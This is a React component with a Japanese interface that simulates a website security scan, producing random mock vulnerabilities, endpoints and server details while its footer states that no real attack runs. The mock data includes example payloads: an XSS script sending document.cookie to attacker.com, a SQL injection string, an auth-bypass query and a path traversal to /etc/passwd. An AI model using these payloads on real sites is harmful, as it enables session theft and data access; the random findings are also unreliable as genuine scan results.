
import React, { useState } from 'react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Card, CardContent, CardDescription, CardFooter, CardHeader, CardTitle } from '@/components/ui/card';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { Alert, AlertDescription, AlertTitle } from '@/components/ui/alert';
import { Shield, AlertTriangle, Database, AlertCircle, CheckCircle, Lock, Unlock, FileCode, Server } from 'lucide-react';
import { toast } from 'sonner';
import { motion } from 'framer-motion';

interface Vulnerability {
  type: 'XSS' | 'SQLInjection' | 'CSRF' | 'Other' | 'DirectoryTraversal' | 'InsecureAPI' | 'WeakCredentials';
  severity: 'Low' | 'Medium' | 'High' | 'Critical';
  description: string;
  impact: string;
  solution: string;
  payload?: string;
  endpoint?: string;
}

interface ScanResult {
  url: string;
  timestamp: string;
  vulnerabilities: Vulnerability[];
  exposedEndpoints: string[];
  serverInfo: {
    server?: string;
    tech?: string[];
  };
}

const SecurityScanner: React.FC = () => {
  const [url, setUrl] = useState('');
  const [isScanning, setIsScanning] = useState(false);
  const [scanComplete, setScanComplete] = useState(false);
  const [vulnerabilities, setVulnerabilities] = useState<Vulnerability[]>([]);
  const [scanProgress, setScanProgress] = useState(0);
  const [scanPhase, setScanPhase] = useState('');
  const [scanResult, setScanResult] = useState<ScanResult | null>(null);
  const [selectedVulnerability, setSelectedVulnerability] = useState<Vulnerability | null>(null);
  const [showModal, setShowModal] = useState(false);

  const simulateScan = (inputUrl: string) => {
    // Reset scan state
    setIsScanning(true);
    setScanComplete(false);
    setScanProgress(0);
    setVulnerabilities([]);
    setScanPhase('初期スキャン開始中...');

    // Validate URL format
    try {
      new URL(inputUrl);
    } catch (_) {
      toast.error('有効なURLを入力してください。', {
        description: 'URLは「https://example.com」の形式で入力してください。',
      });
      setIsScanning(false);
      return;
    }

    // Simulate different scan phases
    const phases = [
      { progress: 10, message: 'ポートスキャン実行中...' },
      { progress: 25, message: 'サーバー設定分析中...' },
      { progress: 40, message: 'エンドポイント列挙中...' },
      { progress: 60, message: 'XSS脆弱性テスト中...' },
      { progress: 75, message: 'SQLインジェクションテスト中...' },
      { progress: 85, message: 'ディレクトリ探索中...' },
      { progress: 95, message: '脆弱性レポート生成中...' }
    ];
    
    let phaseIndex = 0;
    
    // Simulated scan progress with phases
    const progressInterval = setInterval(() => {
      if (phaseIndex < phases.length && scanProgress >= phases[phaseIndex].progress) {
        setScanPhase(phases[phaseIndex].message);
        phaseIndex++;
      }
      
      setScanProgress((prev) => {
        if (prev >= 100) {
          clearInterval(progressInterval);
          return 100;
        }
        return prev + 2;
      });
    }, 200);

    // Simulate scan completion after delay
    setTimeout(() => {
      clearInterval(progressInterval);
      setScanProgress(100);
      setScanPhase('スキャン完了');
      
      // Generate mock scan results based on URL
      const mockVulnerabilities: Vulnerability[] = [];
      const mockExposedEndpoints: string[] = [];
      
      // Regular expressions to match common patterns in URLs
      const isEcommerce = /shop|store|cart|product|checkout/i.test(inputUrl);
      const isCorporate = /corp|company|about|investor/i.test(inputUrl);
      const isOldDomain = /\.jp$|\.co\.jp$|\.or\.jp$/i.test(inputUrl);
      const isGovernment = /\.go\.jp$|\.lg\.jp$/i.test(inputUrl);
      
      // Add exposed endpoints based on URL type
      if (isEcommerce) {
        mockExposedEndpoints.push(
          `${inputUrl}/admin`,
          `${inputUrl}/api/products`,
          `${inputUrl}/cart/checkout`
        );
      }
      
      if (isCorporate) {
        mockExposedEndpoints.push(
          `${inputUrl}/wp-admin`,
          `${inputUrl}/intranet`,
          `${inputUrl}/staff`
        );
      }
      
      if (isGovernment) {
        mockExposedEndpoints.push(
          `${inputUrl}/internal`,
          `${inputUrl}/documents`,
          `${inputUrl}/reports`
        );
      }
      
      // Add some random common endpoints
      const commonEndpoints = [
        '/backup', 
        '/dev', 
        '/test', 
        '/api/users',
        '/login.php',
        '/wp-content',
        '/includes',
        '/upload'
      ];
      
      // Randomly select 2-4 common endpoints
      const numEndpoints = Math.floor(Math.random() * 3) + 2;
      for (let i = 0; i < numEndpoints; i++) {
        const randomIndex = Math.floor(Math.random() * commonEndpoints.length);
        mockExposedEndpoints.push(`${inputUrl}${commonEndpoints[randomIndex]}`);
      }
      
      // XSS vulnerabilities (higher chance for older domains)
      if (Math.random() > (isOldDomain ? 0.2 : 0.5)) {
        mockVulnerabilities.push({
          type: 'XSS',
          severity: 'High',
          description: '反射型クロスサイトスクリプティングの脆弱性が検出されました。',
          impact: '攻撃者がユーザーのセッションを乗っ取り、偽のコンテンツの表示、マルウェアの配布、フィッシング攻撃などを実行できる可能性があります。',
          solution: '入力検証を強化し、ユーザー入力をエスケープするようにしてください。また、Content-Security-Policyヘッダーの実装を検討してください。',
          payload: '<script>fetch("https://attacker.com/steal?cookie="+document.cookie)</script>',
          endpoint: `${inputUrl}/search?q=test`
        });
      }

      // SQL Injection vulnerabilities
      if (Math.random() > (isOldDomain ? 0.3 : 0.6)) {
        mockVulnerabilities.push({
          type: 'SQLInjection',
          severity: 'Critical',
          description: 'SQLインジェクションの脆弱性が検出されました。',
          impact: '攻撃者がデータベースを操作し、機密データの抽出、データの変更、データベースの破壊などを行える可能性があります。',
          solution: 'パラメータ化クエリを使用し、入力値のバリデーションを実装してください。また、データベースユーザーの権限を制限することも重要です。',
          payload: "' OR 1=1; --",
          endpoint: `${inputUrl}/product?id=1`
        });
      }

      // CSRF vulnerabilities
      if (Math.random() > 0.7) {
        mockVulnerabilities.push({
          type: 'CSRF',
          severity: 'Medium',
          description: 'クロスサイトリクエストフォージェリ（CSRF）の脆弱性が検出されました。',
          impact: '攻撃者が認証済みユーザーに代わって不正なアクションを実行する可能性があります。',
          solution: 'CSRFトークンを実装し、重要な操作に対して追加の認証を要求してください。',
          endpoint: `${inputUrl}/settings`
        });
      }

      // Directory Traversal
      if (Math.random() > 0.5) {
        mockVulnerabilities.push({
          type: 'DirectoryTraversal',
          severity: isGovernment ? 'Critical' : 'High',
          description: 'ディレクトリトラバーサル（パストラバーサル）の脆弱性が検出されました。',
          impact: '攻撃者がサーバー上の重要なファイルにアクセスし、システム情報や機密データを取得できる可能性があります。',
          solution: 'ユーザー入力から作成されるファイルパスを厳密に検証し、許可されたディレクトリのみにアクセスを制限してください。',
          payload: '../../../etc/passwd',
          endpoint: `${inputUrl}/download?file=document.pdf`
        });
      }

      // Insecure API
      if (isEcommerce && Math.random() > 0.4) {
        mockVulnerabilities.push({
          type: 'InsecureAPI',
          severity: 'High',
          description: '安全でないAPI実装が検出されました。APIキーが必要ないか、弱い認証が使用されています。',
          impact: '攻撃者が制限されたAPIエンドポイントにアクセスし、データを取得または変更できる可能性があります。',
          solution: '適切な認証と認可メカニズムを実装し、APIキーを安全に管理してください。また、レート制限を設定することも推奨されます。',
          endpoint: `${inputUrl}/api/products`
        });
      }

      // Weak Credentials
      if (Math.random() > 0.6) {
        mockVulnerabilities.push({
          type: 'WeakCredentials',
          severity: 'Medium',
          description: '弱いデフォルト認証情報が検出されました。',
          impact: '攻撃者が一般的なユーザー名とパスワードの組み合わせを使用して管理インターフェースにアクセスできる可能性があります。',
          solution: '強力なパスワードポリシーを実装し、デフォルトの認証情報を変更してください。また、多要素認証の導入も検討してください。',
          endpoint: `${inputUrl}/admin` 
        });
      }

      // Server Information
      const serverTypes = ['Apache/2.4.29', 'nginx/1.18.0', 'Microsoft-IIS/10.0', 'LiteSpeed'];
      const technologies = ['PHP/7.2', 'jQuery/1.8.3', 'WordPress/5.7', 'Bootstrap/4.0', 'React', 'Angular', 'Laravel', 'MySQL', 'MariaDB'];
      
      // Create final scan result
      const result: ScanResult = {
        url: inputUrl,
        timestamp: new Date().toISOString(),
        vulnerabilities: mockVulnerabilities,
        exposedEndpoints: [...new Set(mockExposedEndpoints)], // Remove duplicates
        serverInfo: {
          server: serverTypes[Math.floor(Math.random() * serverTypes.length)],
          tech: Array.from({ length: Math.floor(Math.random() * 3) + 1 }, () => 
            technologies[Math.floor(Math.random() * technologies.length)]
          )
        }
      };
      
      setVulnerabilities(mockVulnerabilities);
      setScanResult(result);
      setIsScanning(false);
      setScanComplete(true);
      
      if (mockVulnerabilities.length === 0) {
        toast.success('スキャン完了', {
          description: '脆弱性は検出されませんでした。',
        });
      } else {
        toast.error(`スキャン完了: ${mockVulnerabilities.length}件の脆弱性が見つかりました`, {
          description: '詳細な結果をご確認ください。',
        });
      }
    }, 7000);
  };

  const handleScan = () => {
    if (!url) {
      toast.error('URLを入力してください');
      return;
    }
    simulateScan(url);
  };

  const getSeverityColor = (severity: string) => {
    switch (severity) {
      case 'Low': return 'bg-blue-100 text-blue-800';
      case 'Medium': return 'bg-yellow-100 text-yellow-800';
      case 'High': return 'bg-orange-100 text-orange-800';
      case 'Critical': return 'bg-red-100 text-red-800';
      default: return 'bg-gray-100 text-gray-800';
    }
  };

  const getVulnerabilityIcon = (type: string) => {
    switch (type) {
      case 'XSS': return <AlertTriangle className="h-5 w-5 text-orange-500" />;
      case 'SQLInjection': return <Database className="h-5 w-5 text-red-500" />;
      case 'CSRF': return <AlertCircle className="h-5 w-5 text-yellow-500" />;
      case 'DirectoryTraversal': return <FileCode className="h-5 w-5 text-purple-500" />;
      case 'InsecureAPI': return <Server className="h-5 w-5 text-pink-500" />;
      case 'WeakCredentials': return <Unlock className="h-5 w-5 text-orange-500" />;
      default: return <Shield className="h-5 w-5 text-blue-500" />;
    }
  };

  const handleViewDetails = (vuln: Vulnerability) => {
    setSelectedVulnerability(vuln);
    setShowModal(true);
  };

  return (
    <div className="w-full max-w-4xl mx-auto p-4">
      <Card className="shadow-lg border-0 overflow-hidden bg-white">
        <CardHeader className="pb-4">
          <CardTitle className="text-2xl font-bold">セキュリティスキャナー</CardTitle>
          <CardDescription>
            ウェブサイトのURLを入力して、セキュリティ脆弱性をスキャンします。
          </CardDescription>
        </CardHeader>
        <CardContent>
          <div className="flex flex-col gap-4">
            <div className="flex gap-2">
              <Input
                type="url"
                placeholder="https://example.com"
                value={url}
                onChange={(e) => setUrl(e.target.value)}
                className="flex-1"
                disabled={isScanning}
              />
              <Button 
                onClick={handleScan} 
                disabled={isScanning}
                className="bg-gradient-to-r from-blue-600 to-blue-700 hover:from-blue-700 hover:to-blue-800 text-white"
              >
                {isScanning ? 'スキャン中...' : 'スキャン開始'}
              </Button>
            </div>

            {isScanning && (
              <div className="mt-4">
                <p className="text-sm text-gray-500 mb-1">{scanPhase}</p>
                <p className="text-sm text-gray-500 mb-2">進捗: {scanProgress}%</p>
                <div className="w-full bg-gray-200 rounded-full h-2.5">
                  <motion.div 
                    className="bg-gradient-to-r from-blue-500 to-blue-700 h-2.5 rounded-full"
                    initial={{ width: '0%' }}
                    animate={{ width: `${scanProgress}%` }}
                    transition={{ duration: 0.3 }}
                  />
                </div>
              </div>
            )}

            {scanComplete && scanResult && (
              <Tabs defaultValue={vulnerabilities.length > 0 ? "results" : "summary"} className="mt-6">
                <TabsList className="w-full grid grid-cols-4">
                  <TabsTrigger value="results">脆弱性</TabsTrigger>
                  <TabsTrigger value="endpoints">露出エンドポイント</TabsTrigger>
                  <TabsTrigger value="visualize">視覚化</TabsTrigger>
                  <TabsTrigger value="summary">概要</TabsTrigger>
                </TabsList>
                
                <TabsContent value="results" className="mt-4">
                  {vulnerabilities.length > 0 ? (
                    <div className="space-y-4">
                      {vulnerabilities.map((vuln, index) => (
                        <motion.div
                          key={index}
                          initial={{ opacity: 0, y: 20 }}
                          animate={{ opacity: 1, y: 0 }}
                          transition={{ delay: index * 0.1 }}
                        >
                          <Alert className="border-l-4 border-l-red-500">
                            <div className="flex items-center gap-2">
                              {getVulnerabilityIcon(vuln.type)}
                              <AlertTitle className="flex items-center gap-2">
                                {vuln.type}
                                <span className={`text-xs px-2 py-1 rounded-full ${getSeverityColor(vuln.severity)}`}>
                                  {vuln.severity}
                                </span>
                              </AlertTitle>
                            </div>
                            <AlertDescription className="mt-2">
                              <p className="font-medium">{vuln.description}</p>
                              <div className="mt-4 space-y-3 text-sm">
                                <div>
                                  <h4 className="font-semibold text-gray-900">影響:</h4>
                                  <p className="text-gray-700">{vuln.impact}</p>
                                </div>
                                {vuln.endpoint && (
                                  <div>
                                    <h4 className="font-semibold text-gray-900">脆弱なエンドポイント:</h4>
                                    <code className="bg-gray-100 px-2 py-1 rounded text-red-600">{vuln.endpoint}</code>
                                  </div>
                                )}
                                {vuln.payload && (
                                  <div>
                                    <h4 className="font-semibold text-gray-900">攻撃ペイロード例:</h4>
                                    <pre className="bg-gray-100 p-2 rounded overflow-x-auto text-xs">
                                      <code>{vuln.payload}</code>
                                    </pre>
                                  </div>
                                )}
                                <div>
                                  <h4 className="font-semibold text-gray-900">対策:</h4>
                                  <p className="text-gray-700">{vuln.solution}</p>
                                </div>
                                <div className="pt-2">
                                  <Button 
                                    variant="outline" 
                                    size="sm"
                                    onClick={() => handleViewDetails(vuln)}
                                  >
                                    詳細を表示
                                  </Button>
                                </div>
                              </div>
                            </AlertDescription>
                          </Alert>
                        </motion.div>
                      ))}
                    </div>
                  ) : (
                    <div className="p-8 text-center">
                      <motion.div
                        initial={{ scale: 0 }}
                        animate={{ scale: 1 }}
                        transition={{ type: "spring", stiffness: 200, damping: 15 }}
                        className="inline-flex rounded-full bg-green-100 p-4 mb-4"
                      >
                        <CheckCircle className="h-8 w-8 text-green-600" />
                      </motion.div>
                      <h3 className="text-xl font-medium text-gray-900 mt-2">セキュリティチェック完了</h3>
                      <p className="text-gray-500 mt-1">検出された脆弱性はありません。</p>
                    </div>
                  )}
                </TabsContent>
                
                <TabsContent value="endpoints" className="mt-4">
                  <div className="p-4 bg-gray-50 rounded-lg">
                    <h3 className="text-lg font-medium mb-3">露出したエンドポイント</h3>
                    <p className="text-sm text-gray-600 mb-4">
                      これらのエンドポイントはパブリックにアクセス可能であり、潜在的なリスクを引き起こす可能性があります。
                    </p>
                    
                    {scanResult.exposedEndpoints.length > 0 ? (
                      <div className="space-y-2">
                        {scanResult.exposedEndpoints.map((endpoint, index) => (
                          <motion.div 
                            key={index}
                            initial={{ opacity: 0, x: -20 }}
                            animate={{ opacity: 1, x: 0 }}
                            transition={{ delay: index * 0.1 }}
                            className="bg-white p-3 rounded-lg border border-gray-200 flex items-center gap-3"
                          >
                            <div className="bg-red-100 p-2 rounded">
                              <Unlock size={18} className="text-red-500" />
                            </div>
                            <div className="flex-1 overflow-hidden">
                              <p className="font-medium truncate">{endpoint}</p>
                              <p className="text-xs text-gray-500">
                                {endpoint.includes('/admin') ? '管理パネルが露出しています' : 
                                 endpoint.includes('/api') ? 'API エンドポイントが保護されていません' : 
                                 endpoint.includes('/wp-') ? 'WordPress ファイルが露出しています' :
                                 '潜在的に機密性の高いエンドポイント'}
                              </p>
                            </div>
                          </motion.div>
                        ))}
                      </div>
                    ) : (
                      <p className="text-center text-gray-500 py-4">露出したエンドポイントは検出されませんでした。</p>
                    )}
                  </div>
                </TabsContent>
                
                <TabsContent value="visualize" className="mt-4">
                  <div className="bg-gray-50 rounded-lg p-4">
                    <h3 className="text-lg font-medium mb-3">脆弱性の視覚化</h3>
                    
                    <div className="relative bg-white rounded-lg border border-gray-200 p-4 overflow-hidden">
                      {/* Website representation */}
                      <div className="border-b pb-2 mb-4 text-center">
                        <div className="flex items-center justify-center">
                          <Lock className="h-4 w-4 text-gray-400 mr-1" />
                          <span className="text-sm text-gray-500 truncate">{url}</span>
                        </div>
                      </div>
                      
                      {/* Website layout representation */}
                      <div className="h-64 relative">
                        {/* Header */}
                        <div className="absolute top-0 left-0 right-0 h-10 bg-gray-100 rounded-t"></div>
                        
                        {/* Main content area */}
                        <div className="absolute top-12 left-0 right-0 bottom-12 flex">
                          {/* Sidebar */}
                          <div className="w-1/4 bg-gray-50 mr-2"></div>
                          
                          {/* Content */}
                          <div className="flex-1 bg-white relative">
                            {vulnerabilities.map((vuln, index) => {
                              // Calculate random position for vulnerability "hole"
                              const top = Math.floor(Math.random() * 80) + 10;
                              const left = Math.floor(Math.random() * 80) + 10;
                              const size = vuln.severity === 'Critical' ? 40 : 
                                         vuln.severity === 'High' ? 30 :
                                         vuln.severity === 'Medium' ? 20 : 15;
                                         
                              return (
                                <motion.div
                                  key={index}
                                  initial={{ scale: 0 }}
                                  animate={{ scale: 1 }}
                                  transition={{ 
                                    delay: index * 0.2,
                                    type: 'spring',
                                    stiffness: 200,
                                    damping: 10
                                  }}
                                  className="absolute rounded-full"
                                  style={{
                                    top: `${top}%`,
                                    left: `${left}%`,
                                    width: size,
                                    height: size,
                                    backgroundColor: vuln.severity === 'Critical' ? 'rgba(220, 38, 38, 0.8)' :
                                                   vuln.severity === 'High' ? 'rgba(234, 88, 12, 0.7)' :
                                                   vuln.severity === 'Medium' ? 'rgba(234, 179, 8, 0.6)' :
                                                   'rgba(59, 130, 246, 0.5)',
                                    boxShadow: vuln.severity === 'Critical' ? '0 0 20px rgba(220, 38, 38, 0.7)' :
                                              vuln.severity === 'High' ? '0 0 15px rgba(234, 88, 12, 0.6)' : 
                                              'none',
                                    zIndex: vuln.severity === 'Critical' ? 30 :
                                           vuln.severity === 'High' ? 20 :
                                           vuln.severity === 'Medium' ? 10 : 1,
                                  }}
                                  data-severity={vuln.severity}
                                  data-type={vuln.type}
                                ></motion.div>
                              );
                            })}
                          </div>
                        </div>
                        
                        {/* Footer */}
                        <div className="absolute bottom-0 left-0 right-0 h-10 bg-gray-100 rounded-b"></div>
                      </div>
                      
                      <div className="mt-4 flex flex-wrap justify-center gap-2">
                        <div className="flex items-center">
                          <div className="w-3 h-3 rounded-full bg-red-600 mr-1"></div>
                          <span className="text-xs">Critical</span>
                        </div>
                        <div className="flex items-center">
                          <div className="w-3 h-3 rounded-full bg-orange-500 mr-1"></div>
                          <span className="text-xs">High</span>
                        </div>
                        <div className="flex items-center">
                          <div className="w-3 h-3 rounded-full bg-yellow-400 mr-1"></div>
                          <span className="text-xs">Medium</span>
                        </div>
                        <div className="flex items-center">
                          <div className="w-3 h-3 rounded-full bg-blue-400 mr-1"></div>
                          <span className="text-xs">Low</span>
                        </div>
                      </div>
                      
                      <p className="text-xs text-gray-500 mt-2 text-center">
                        ※ 色付きの円は脆弱性の「穴」を表しています。サイズが大きいほど重大な脆弱性です。
                      </p>
                    </div>
                  </div>
                </TabsContent>
                
                <TabsContent value="summary" className="mt-4">
                  <div className="p-4 bg-gray-50 rounded-lg">
                    <h3 className="text-lg font-medium mb-3">スキャン概要</h3>
                    <div className="grid grid-cols-2 gap-4">
                      <div className="bg-white p-4 rounded-lg shadow-sm">
                        <p className="text-sm text-gray-500">スキャンしたURL</p>
                        <p className="font-medium truncate">{url}</p>
                      </div>
                      <div className="bg-white p-4 rounded-lg shadow-sm">
                        <p className="text-sm text-gray-500">検出された脆弱性</p>
                        <p className="font-medium">{vulnerabilities.length}</p>
                      </div>
                      <div className="bg-white p-4 rounded-lg shadow-sm">
                        <p className="text-sm text-gray-500">サーバー情報</p>
                        <p className="font-medium">{scanResult.serverInfo.server || 'Unknown'}</p>
                        <div className="flex flex-wrap gap-1 mt-1">
                          {scanResult.serverInfo.tech?.map((tech, index) => (
                            <span key={index} className="text-xs bg-gray-100 px-2 py-0.5 rounded">
                              {tech}
                            </span>
                          ))}
                        </div>
                      </div>
                      <div className="bg-white p-4 rounded-lg shadow-sm">
                        <p className="text-sm text-gray-500">露出エンドポイント</p>
                        <p className="font-medium">{scanResult.exposedEndpoints.length}</p>
                      </div>
                      <div className="bg-white p-4 rounded-lg shadow-sm col-span-2">
                        <p className="text-sm text-gray-500">深刻度の内訳</p>
                        <div className="flex gap-2 mt-2">
                          {['Critical', 'High', 'Medium', 'Low'].map((severity) => {
                            const count = vulnerabilities.filter(v => v.severity === severity).length;
                            return (
                              <div key={severity} className={`px-2 py-1 rounded-md text-xs flex items-center gap-1 ${getSeverityColor(severity)}`}>
                                <span>{severity}</span>
                                <span className="font-bold">{count}</span>
                              </div>
                            );
                          })}
                        </div>
                      </div>
                      <div className="bg-white p-4 rounded-lg shadow-sm col-span-2">
                        <p className="text-sm text-gray-500 mb-2">セキュリティ評価</p>
                        <div className="relative pt-1">
                          <div className="flex items-center justify-between">
                            <div>
                              <span className="text-xs font-semibold inline-block text-red-600">
                                危険
                              </span>
                            </div>
                            <div>
                              <span className="text-xs font-semibold inline-block text-green-600">
                                安全
                              </span>
                            </div>
                          </div>
                          <div className="overflow-hidden h-2 mb-4 text-xs flex rounded bg-gray-200">
                            {/* Calculate score based on vulnerabilities */}
                            {(() => {
                              const criticalCount = vulnerabilities.filter(v => v.severity === 'Critical').length;
                              const highCount = vulnerabilities.filter(v => v.severity === 'High').length;
                              const mediumCount = vulnerabilities.filter(v => v.severity === 'Medium').length;
                              const lowCount = vulnerabilities.filter(v => v.severity === 'Low').length;
                              
                              // Calculate score (0-100, higher is better)
                              let score = 100;
                              score -= criticalCount * 25;
                              score -= highCount * 15;
                              score -= mediumCount * 7;
                              score -= lowCount * 3;
                              score = Math.max(5, score); // Minimum score of 5
                              
                              // Color based on score
                              let color = '';
                              if (score >= 80) color = 'bg-green-500';
                              else if (score >= 60) color = 'bg-green-300';
                              else if (score >= 40) color = 'bg-yellow-400';
                              else if (score >= 20) color = 'bg-orange-400';
                              else color = 'bg-red-500';
                              
                              return (
                                <div
                                  style={{ width: `${score}%` }}
                                  className={`shadow-none flex flex-col text-center whitespace-nowrap text-white justify-center ${color}`}
                                ></div>
                              );
                            })()}
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </TabsContent>
              </Tabs>
            )}
          </div>
        </CardContent>
        <CardFooter className="bg-gray-50 flex flex-col items-start pt-4">
          <p className="text-sm text-gray-500">
            このスキャナーはウェブサイトのセキュリティ脆弱性を視覚化し、潜在的な攻撃ベクトルを示します。
            実際の攻撃は実行せず、潜在的な脆弱性のみをシミュレーションします。
          </p>
        </CardFooter>
      </Card>
      
      {/* Modal for vulnerability details */}
      {showModal && selectedVulnerability && (
        <div className="fixed inset-0 bg-gray-600 bg-opacity-50 overflow-y-auto h-full w-full z-50 flex items-center justify-center">
          <div className="relative mx-auto p-5 border w-11/12 md:w-3/4 lg:w-1/2 shadow-lg rounded-md bg-white">
            <div className="flex justify-between items-center border-b pb-3 mb-4">
              <h3 className="text-lg font-medium flex items-center gap-2">
                {getVulnerabilityIcon(selectedVulnerability.type)}
                <span>{selectedVulnerability.type} 脆弱性詳細</span>
                <span className={`ml-2 text-xs px-2 py-1 rounded-full ${getSeverityColor(selectedVulnerability.severity)}`}>
                  {selectedVulnerability.severity}
                </span>
              </h3>
              <button
                onClick={() => setShowModal(false)}
                className="text-gray-400 hover:text-gray-500"
              >
                <svg className="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M6 18L18 6M6 6l12 12" />
                </svg>
              </button>
            </div>
            
            <div className="space-y-4">
              <div>
                <h4 className="font-semibold text-gray-900">説明:</h4>
                <p>{selectedVulnerability.description}</p>
              </div>
              
              <div>
                <h4 className="font-semibold text-gray-900">技術的詳細:</h4>
                <div className="bg-gray-50 p-4 rounded">
                  {selectedVulnerability.type === 'XSS' && (
                    <div className="space-y-3">
                      <p>
                        クロスサイトスクリプティング (XSS) 攻撃は、悪意のあるスクリプトをウェブページに注入することで、
                        訪問者のブラウザで実行されるようにする攻撃です。
                      </p>
                      <div>
                        <h5 className="font-medium">攻撃シナリオ:</h5>
                        <ol className="list-decimal list-inside text-sm space-y-1">
                          <li>攻撃者が脆弱なページに悪意のあるスクリプトを送信します</li>
                          <li>サーバーがスクリプトを適切にエスケープせずにユーザーに返します</li>
                          <li>ユーザーのブラウザがスクリプトを実行し、Cookieやセッション情報が漏洩します</li>
                        </ol>
                      </div>
                      <div>
                        <h5 className="font-medium">実際の攻撃ペイロード:</h5>
                        <pre className="bg-gray-100 p-2 rounded overflow-x-auto text-xs">
                          <code>{selectedVulnerability.payload || '<script>alert("XSS")</script>'}</code>
                        </pre>
                      </div>
                    </div>
                  )}
                  
                  {selectedVulnerability.type === 'SQLInjection' && (
                    <div className="space-y-3">
                      <p>
                        SQLインジェクションは、アプリケーションがユーザー入力を適切に検証せずにSQL文に挿入する際に発生します。
                        攻撃者はSQL文の構造を変更し、データベースからデータを抽出したり改ざんしたりできます。
                      </p>
                      <div>
                        <h5 className="font-medium">攻撃シナリオ:</h5>
                        <ol className="list-decimal list-inside text-sm space-y-1">
                          <li>脆弱なフォームやURLパラメータに悪意のあるSQL文を注入します</li>
                          <li>アプリケーションはこれを有効なクエリとして処理します</li>
                          <li>データベースが攻撃者の意図した操作を実行します</li>
                        </ol>
                      </div>
                      <div>
                        <h5 className="font-medium">通常のクエリ:</h5>
                        <pre className="bg-gray-100 p-2 rounded overflow-x-auto text-xs">
                          <code>SELECT * FROM users WHERE username = 'input' AND password = 'password'</code>
                        </pre>
                      </div>
                      <div>
                        <h5 className="font-medium">悪意のあるクエリ:</h5>
                        <pre className="bg-gray-100 p-2 rounded overflow-x-auto text-xs">
                          <code>SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything'</code>
                        </pre>
                        <p className="text-xs mt-1">
                          この例では、「--」以降のクエリが無効化され、パスワードチェックなしでログインが可能になります。
                        </p>
                      </div>
                    </div>
                  )}
                  
                  {selectedVulnerability.type === 'DirectoryTraversal' && (
                    <div className="space-y-3">
                      <p>
                        ディレクトリトラバーサル（パストラバーサル）攻撃では、攻撃者はファイルシステム内のパスを操作して、
                        アクセスすべきでないディレクトリやファイルにアクセスします。
                      </p>
                      <div>
                        <h5 className="font-medium">攻撃シナリオ:</h5>
                        <ol className="list-decimal list-inside text-sm space-y-1">
                          <li>攻撃者は「../」などの特殊なパス指定子を使用してディレクトリを上に移動します</li>
                          <li>サーバーがパスの検証を適切に行わないと、重要なシステムファイルが露出します</li>
                        </ol>
                      </div>
                      <div>
                        <h5 className="font-medium">脆弱なリクエスト:</h5>
                        <pre className="bg-gray-100 p-2 rounded overflow-x-auto text-xs">
                          <code>{`${selectedVulnerability.endpoint || 'https://example.com/download?file=../../../etc/passwd'}`}</code>
                        </pre>
                      </div>
                    </div>
                  )}
                  
                  {/* Default for other vulnerability types */}
                  {!['XSS', 'SQLInjection', 'DirectoryTraversal'].includes(selectedVulnerability.type) && (
                    <div>
                      <p>この脆弱性は {selectedVulnerability.endpoint || url} で検出されました。</p>
                      <p className="mt-2">影響: {selectedVulnerability.impact}</p>
                    </div>
                  )}
                </div>
              </div>
              
              <div>
                <h4 className="font-semibold text-gray-900">影響:</h4>
                <p>{selectedVulnerability.impact}</p>
              </div>
              
              <div>
                <h4 className="font-semibold text-gray-900">推奨される対策:</h4>
                <p>{selectedVulnerability.solution}</p>
              </div>
              
              <div>
                <h4 className="font-semibold text-gray-900">参考リソース:</h4>
                <ul className="list-disc list-inside text-sm text-blue-600 space-y-1">
                  <li>
                    <a href="https://owasp.org/Top10/" target="_blank" rel="noopener noreferrer">
                      OWASP Top 10
                    </a>
                  </li>
                  <li>
                    <a href="https://cheatsheetseries.owasp.org/" target="_blank" rel="noopener noreferrer">
                      OWASP Cheat Sheet Series
                    </a>
                  </li>
                  <li>
                    <a href="https://portswigger.net/web-security" target="_blank" rel="noopener noreferrer">
                      PortSwigger Web Security Academy
                    </a>
                  </li>
                </ul>
              </div>
            </div>
            
            <div className="mt-6 text-right">
              <Button onClick={() => setShowModal(false)}>閉じる</Button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};

export default SecurityScanner;
